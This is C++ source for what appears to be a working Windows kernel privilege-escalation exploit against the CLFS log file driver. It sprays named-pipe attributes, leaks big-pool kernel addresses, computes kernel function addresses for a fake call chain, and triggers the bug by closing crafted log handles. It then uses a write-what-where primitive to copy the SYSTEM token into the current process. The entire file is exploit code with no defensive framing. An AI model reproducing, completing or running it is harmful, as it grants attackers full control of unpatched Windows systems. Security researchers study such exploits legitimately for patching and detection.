#include "preparePipe.h"
#include <string>
#include "Prepare_BigPool.h"
#include "CreateLogFile.h"
#include "leak.h"
#include "init.h"

UINT PIPE_ATTR_TAG = 0x7441704E;
func* _NtFsControlFile = nullptr;
DWORD* hReadPipe[2] = { 0, 0 };
IO_STATUS_BLOCK statusBlock;
UINT64 offset_SeSetAccess = 0;
UINT64 fnSeSetAccessStateGenericMapping = 0;
UINT64 offset_ClfsEarlier = 0;
UINT64 offset_AcquireForLazyWrite = 0;
UINT64 fnClfsEarlierLsn = 0;
UINT64 fnAcquireForLazyWrite = 0;
ULONG64 system_EPROCESS_value = 0;
ULONG64 system_token_value = 0;
int preparePipe() {
	HMODULE nt = GetModuleHandleA("ntdll");
	if (!nt) {
		printf("[-] Failed to get handle to ntdll.dll.\n");
		return -1;
	}
	_NtFsControlFile = (func*)GetProcAddress(nt, "NtFsControlFile");
	if (!_NtFsControlFile) {
		printf("[-] Failed to get address of NtFsControlFile.\n");
		return -1;
	}
	printf("[+] NtFsControlFile address: %p\n", _NtFsControlFile);

	BOOL status = CreatePipe((PHANDLE)&hReadPipe[1], (PHANDLE)&hReadPipe[0], NULL, 0x1000);
	if (!status) {
		printf("[-] Failed to create pipe, error: %d\n", GetLastError());
		return -1;
	}
	printf("[+] Pipe created successfully.\n");
	// Set the pipe attributes
	printf("[+] Pipe Read Handle: %x\n[+] Pipe Write Handle: %x\n", hReadPipe[1], hReadPipe[0]);

	PVOID pipeDataBuffer = _malloc_base(0x2000);
	memset((UINT64*)pipeDataBuffer + 1, 0x41, 0xffe);
	*(UINT64*)pipeDataBuffer = 0x5a;

	void* controlOutBuffer = malloc(0x100);
	memset(controlOutBuffer, 0x42, 0xff);

	_NtFsControlFile(hReadPipe[0], nullptr, nullptr, nullptr, &statusBlock, 0x11003c, pipeDataBuffer, 0xfd8, controlOutBuffer, 0x100);
	DWORD* bigPoolBuffer = (DWORD*)VirtualAlloc(0, 0x1000, 0x1000, 4);
	ULONG retlen;

	NTSTATUS status1 = fnNtQuerySystemInformation(SystemBigPoolInformation, bigPoolBuffer, 0x1000, &retlen);
	if (status1 == STATUS_INFO_LENGTH_MISMATCH) {
		VirtualFree(bigPoolBuffer, 0, MEM_RELEASE);
		bigPoolBuffer = (DWORD*)VirtualAlloc(0, retlen, MEM_COMMIT, PAGE_READWRITE);
		if (!bigPoolBuffer) {
			printf("[-] Failed to allocate memory for big pool buffer.\n");
			return -1;
		}
		status1 = fnNtQuerySystemInformation(SystemBigPoolInformation, bigPoolBuffer, retlen, &retlen);
	}
	PSYSTEM_BIGPOOL_INFORMATION pBuf = (PSYSTEM_BIGPOOL_INFORMATION)(bigPoolBuffer);
	for (ULONG i = 0; i < pBuf->Count; i++) {
		if (pBuf->AllocatedInfo[i].TagUlong == PIPE_ATTR_TAG) {
			printf("[+] Found PIPE_ATTR_TAG at index %lu, Virtual Address: %p\n", i, pBuf->AllocatedInfo[i].VirtualAddress);
			statusBlock.Pointer = (PVOID)pBuf->AllocatedInfo[i].VirtualAddress;   // PipeAttribute address 
			break;
		}
	}
	printf("[+] Pipe attribute tag found at: %p\n", statusBlock.Pointer);
    PVOID pAttributeValueSize = (PVOID)((ULONG_PTR)statusBlock.Pointer + 0x18);
	PVOID pAttributeValue = (PVOID)((ULONG_PTR)statusBlock.Pointer + 0x20);
	printf("[+] Pipe Attribute Value Address: %p\n", pAttributeValue);
	printf("[+] Pipe Attribute Size Address: %p\n", pAttributeValueSize);
	
	for (int i = 8+0xe; i < 0x1000000 - 0x400000; i+=0x10) {
		*(UINT64*)(i + 0x400000) = (UINT64)pAttributeValueSize;
	}

	for (int i = 0x6+8; i < 0x10000 - 0x10; i += 0x10) {
		*(UINT64*)(0x30C1FD0000 + i) = (UINT64)pAttributeValueSize;
	}

	FARPROC _ClfsEarlierLsn = NULL;
	HMODULE CLFS_userBase = LoadLibraryExW(L"C:\\Windows\\System32\\drivers\\CLFS.SYS", 0, 1);
	if (CLFS_userBase)
	{
		_ClfsEarlierLsn = GetProcAddress(CLFS_userBase, "ClfsEarlierLsn");
		
	}

	FARPROC _SeSetAccessStateGenericMapping = NULL;
	HMODULE ntos_userBase = LoadLibraryExW(L"ntoskrnl.exe", 0, 1);
	if (ntos_userBase)
	{
		_SeSetAccessStateGenericMapping = GetProcAddress(ntos_userBase, "SeSetAccessStateGenericMapping");
	}

	printf("[+] NTOSKRNL base on user  -------------------------> %p\n", ntos_userBase);
	printf("[+] NTOSKRNL base on Kernel ------------------------> %p\n", ntos_kernelBase);
	printf("[+] SeSetAccessStateGenericMapping user address ----> %p\n", _SeSetAccessStateGenericMapping);
	offset_SeSetAccess = (UINT64)_SeSetAccessStateGenericMapping - (UINT64)ntos_userBase;
	printf("[+] Offset SeSetAccessStateGenericMapping ----------> %p\n", offset_SeSetAccess);
	fnSeSetAccessStateGenericMapping = ntos_kernelBase + offset_SeSetAccess;
	printf("[+] SeSetAccessStateGenericMapping kernel address --> %p\n\n", fnSeSetAccessStateGenericMapping);


	printf("[+] CLFS.SYS base on user  -------------------------> %p\n", CLFS_userBase);
	printf("[+] CLFS base on Kernel  ---------------------------> %p\n", clfs_kernelBase);
	printf("[+] ClfsEarlierLsn user address --------------------> %p\n", _ClfsEarlierLsn);
	offset_ClfsEarlier = (UINT64)_ClfsEarlierLsn - (UINT64)CLFS_userBase;
	printf("[+] Offset ClfsEarlierLsn --------------------------> %p\n", offset_ClfsEarlier);
	offset_AcquireForLazyWrite = (UINT64)0x10440; 
	printf("[+] Offset AcquireForLazyWrite ---------------------> %p\n", offset_AcquireForLazyWrite);
	fnAcquireForLazyWrite = clfs_kernelBase + offset_AcquireForLazyWrite;
	fnClfsEarlierLsn = clfs_kernelBase + offset_ClfsEarlier;

	printf("[+] ClfsEarlierLsn kernel address ------------------> %p\n", fnClfsEarlierLsn);
	printf("[+] AcquireForLazyWrite kernel address --------------> %p\n", fnAcquireForLazyWrite);

	FindPreviousModeAddress();

	*(UINT64*)0x0000030c1fdf27e = 0x50000a0;
	*(PUINT64)(0x5000000) = 0x123456789;
	*(PUINT64)(0x5000008) = fnAcquireForLazyWrite;
	*(UINT64*)0x50000a0 = 0x5000100;
	*(UINT64*)0x50002D0 = fnClfsEarlierLsn;
	*(UINT64*)0x50000FF = 0x5000200;
	*(UINT64*)0x5000210 = fnSeSetAccessStateGenericMapping;
	*(UINT64*)0x5000147 = (ULONG64) pAttributeValue - 8+1;					//where
	//*(UINT64*)0x5000258 = 0x50002D0;					//where 
	uint64_t high = 0x5a;
	uint64_t combined_high = (high << 56) | (system_EPROCESS >> 8);
	printf("Result: 0x%llx\n", combined_high);
	*(UINT64*)0xffffff00 = combined_high;			//what
	printf("[+] Pipe attribute value set to: %p\n", pAttributeValue);
	return 0;
}  

int trigger() { 
	std::wstring logFileName = L"LOG:";
	std::wstring inputName = L"C:\\Users\\goose\\Desktop\\hieu";
	logFileName += inputName;

	HANDLE hLogFile = CreateLogFile(logFileName.c_str(), 0xc0010000, 3, 0, 4, 0);
	if (hLogFile == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to create log file: %s\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] Log file created successfully: %ws\n", logFileName.c_str());
	}

	UINT64 lastFoundClfsAddr = 0;
	PUINT64 NewClfsAddrArray = GetBigPoolInfo();
	lastFoundClfsAddr = findNewClfsAddress(StoreClfsAddrArray, NewClfsAddrArray);
	printf("[+] New BigPool Address of CLFS tag: %p\n", lastFoundClfsAddr);
	StoreClfsAddrArray = NewClfsAddrArray;

	std::wstring logFileName2 = L"LOG:";
	std::wstring inputName2 = L"C:\\Users\\goose\\Desktop\\tmp";
	logFileName2 += inputName2;
	HANDLE hLogFile2 = CreateLogFile(logFileName2.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, 3u, 0, 4u, 0);

	if (hLogFile2 == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to create log file: %s\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] Log file created successfully: %ws\n", logFileName2.c_str());
	}

	NewClfsAddrArray = GetBigPoolInfo();
	lastFoundClfsAddr = findNewClfsAddress(StoreClfsAddrArray, NewClfsAddrArray);
	printf("[+] New BigPool Address of CLFS tag: %p\n", lastFoundClfsAddr);
	StoreClfsAddrArray = NewClfsAddrArray;
	ULONGLONG cbContainer = 512;
	if (!AddLogContainer(hLogFile2, (PULONGLONG)&cbContainer, (LPWSTR)L"C:\\Users\\goose\\Desktop\\container1", 0)) {
		printf("AddLogContainer failed with error %d\n", GetLastError());
		return -1;
	}
	
	printf("[+] Log container added successfully.\n");

	if (!AddLogContainer(hLogFile, (PULONGLONG)&cbContainer, (LPWSTR)L"C:\\Users\\goose\\Desktop\\container2", 0)) {				//crash
		printf("AddLogContainer failed with error %d\n", GetLastError());
	}
	else {
		printf("[+] Log container added successfully.\n");
	}
	
	// close the log file handles
	//DeleteLogFile(logFileName2.c_str(), 0);
	typedef NTSTATUS func(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
	func* _NtSetInformationFile = (func*)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtSetInformationFile");
	char v33[16] = { 0 };
	char v28[4] = {};
	NTSTATUS setresult = _NtSetInformationFile(hLogFile2, (PIO_STATUS_BLOCK)v33, v28, 1, (FILE_INFORMATION_CLASS)13);
	//getchar();
	CloseHandle(hLogFile2); //trigger bug
	CloseHandle(hLogFile);

	printf("[+] Log files closed successfully.\n");
	
	void* v9b = _malloc_base(0x2000);
	memset(v9b, 0, 0x2000); // fill buffer with 0x42
	int v29 = 90;
	getchar();
	_NtFsControlFile(hReadPipe[0], 0, 0, 0, &statusBlock, 0x110038, &v29, 2, v9b, 0x2000);

	// print v9b content
	printf("[+] Pipe read data: ");
	for (int i = 0; i < 0x2000; i++) {
		printf("%02x ", ((unsigned char*)v9b)[i]);
		if ((i + 1) % 16 == 0) {
			printf("\n");
		}
	}
	// token is located at offset 0x4ce
	PVOID token_address = (unsigned char*)v9b + 0x4ce;
	printf("[+] Token Address: %p\n", token_address);

	// extract token value
	ULONG64 token_value = *(ULONG64*)(token_address);
	system_token_value = token_value & ~0xf;
	printf("[+] Token Value: %llx\n", system_token_value);

	_free_base(v9b);
	printf("[+] Pipe read data printed successfully.\n");
	return 0;

}




int trigger2() {
	std::wstring logFileName = L"LOG:";
	std::wstring inputName = L"C:\\Users\\goose\\Desktop\\hieu2";
	logFileName += inputName;

	HANDLE hLogFile = CreateLogFile(logFileName.c_str(), 0xc0010000, 3, 0, 4, 0);
	if (hLogFile == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to create log file: %s\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] Log file created successfully: %ws\n", logFileName.c_str());
	}

	UINT64 lastFoundClfsAddr = 0;
	PUINT64 NewClfsAddrArray = GetBigPoolInfo();
	lastFoundClfsAddr = findNewClfsAddress(StoreClfsAddrArray, NewClfsAddrArray);
	printf("[+] New BigPool Address of CLFS tag: %p\n", lastFoundClfsAddr);
	StoreClfsAddrArray = NewClfsAddrArray;

	std::wstring logFileName2 = L"LOG:";
	std::wstring inputName2 = L"C:\\Users\\goose\\Desktop\\tmp2";
	logFileName2 += inputName2;
	HANDLE hLogFile2 = CreateLogFile(logFileName2.c_str(), GENERIC_READ | GENERIC_WRITE | DELETE, 3u, 0, 4u, 0);

	if (hLogFile2 == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to create log file: %s\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] Log file created successfully: %ws\n", logFileName2.c_str());
	}

	NewClfsAddrArray = GetBigPoolInfo();
	lastFoundClfsAddr = findNewClfsAddress(StoreClfsAddrArray, NewClfsAddrArray);
	printf("[+] New BigPool Address of CLFS tag: %p\n", lastFoundClfsAddr);
	StoreClfsAddrArray = NewClfsAddrArray;
	ULONGLONG cbContainer = 512;
	if (!AddLogContainer(hLogFile2, (PULONGLONG)&cbContainer, (LPWSTR)L"C:\\Users\\goose\\Desktop\\container3", 0)) {
		printf("AddLogContainer failed with error %d\n", GetLastError());
		return -1;
	}

	printf("[+] Log container added successfully.\n");

	if (!AddLogContainer(hLogFile, (PULONGLONG)&cbContainer, (LPWSTR)L"C:\\Users\\goose\\Desktop\\container4", 0)) {				//crash
		printf("AddLogContainer failed with error %d\n", GetLastError());
	}
	else {
		printf("[+] Log container added successfully.\n");
	}

	// close the log file handles
	//DeleteLogFile(logFileName2.c_str(), 0);
	typedef NTSTATUS func(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
	func* _NtSetInformationFile = (func*)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtSetInformationFile");
	char v33[16] = { 0 };
	char v28[4] = {};
	NTSTATUS setresult = _NtSetInformationFile(hLogFile2, (PIO_STATUS_BLOCK)v33, v28, 1, (FILE_INFORMATION_CLASS)13);
	//DeleteLogFile(logFileName2.c_str(), 0);
	*(UINT64*)0x5000147 = (UINT64)g_EProcessAddress + 0x4b8-8;					//where
	//*(UINT64*)0x5000258 = 0x50002D0;					//where 
	*(UINT64*)0xffffff00 = system_token_value;			//what
	getchar();
	CloseHandle(hLogFile2);
	CloseHandle(hLogFile);

	printf("[+] Log files closed successfully.\n");
	

	return 0;

}



